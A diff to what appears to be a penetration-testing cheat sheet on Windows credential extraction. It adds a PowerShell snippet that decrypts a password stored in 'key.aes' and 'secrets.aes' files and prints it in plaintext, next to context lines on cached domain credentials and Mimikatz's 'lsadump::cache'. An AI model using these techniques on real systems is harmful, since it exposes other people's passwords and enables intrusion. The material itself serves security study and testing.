@@ -212,6 +212,19 @@ HKEY_LOCAL_MACHINE\SECURITY\Cache
 **Extracting from Mimikatz**: `lsadump::cache`\
 From [here](http://juggernaut.wikidot.com/cached-credentials).
 
+## key.aes + secret.aes
+
+```powershell
+$username = "Username"
+$GetKey = Get-Content "C:\users\thalpius\downloads\key.aes"
+$EncryptedPasswordFile = "C:\users\thalpius\downloads\secrets.aes"
+$SecureStringPassword = Get-Content -Path $EncryptedPasswordFile | ConvertTo-
+SecureString -Key $GetKey
+$Credential = New-Object -TypeName System.Management.Automation.PSCredential
+-ArgumentList $username,$SecureStringPassword
+$Credential.GetNetworkCredential().Password
+```
+
 ## Protected Users
 
 When the signed in user is a member of the Protected Users group the following protections are applied:
